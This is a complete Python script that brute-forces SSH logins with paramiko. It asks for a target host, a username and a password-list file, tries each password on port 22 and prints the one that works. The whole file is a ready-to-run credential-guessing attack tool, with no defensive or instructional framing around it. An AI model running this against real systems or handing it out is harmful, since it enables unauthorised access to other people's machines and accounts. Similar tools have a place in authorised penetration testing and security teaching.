import paramiko, sys, os, socket, termcolor

# Create an SSH client object
ssh = paramiko.SSHClient()

# Function to establish an SSH connection
def ssh_connect(password, code=0):
    # Set the host key policy to automatically add unknown hosts
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)

    try:
        # Connect to the SSH server using the provided credentials
        ssh.connect(host, port=22, username=username, password=password)
    except paramiko.AuthenticationException:
        # If authentication fails, set the code to 1
        code = 1
    except socket.error:
        # If there is a socket error, set the code to 2
        code = 2

    # Close the SSH connection
    ssh.close()
    return code

# Get the target address, SSH username, and passwords file from the user
host = input('[+] Target Address: ')
username = input('[+] SSH Username: ')
input_file = input('[+] Passwords File: ')
print('\n')

# Check if the passwords file exists
if os.path.exists(input_file) == False:
    print('[!!] That File/Path Does Not Exist')
    sys.exit(1)

# Open the passwords file and iterate over each line
with open(input_file, 'r') as file:
    for line in file.readlines():
        password = line.strip()
        try:
            # Attempt to establish an SSH connection using the current password
            response = ssh_connect(password)
            if response == 0:
                # If the connection is successful, print the password and break the loop
                print(termcolor.colored(('[+] Found Password: ' + password + ' ,For Account: ' + username),'green'))
                break
            elif response == 1:
                # If authentication fails, print an incorrect login message
                print('[-] Incorrect Password for: '+username+ ' password: '+ password)
            elif response == 2:
                # If there is a socket error, print an error message and exit the program
                print('[!!] Can Not Connect')
                sys.exit(1)
        except Exception as e:
            # If any other exception occurs, print the error message and continue to the next password
            print(e)
            pass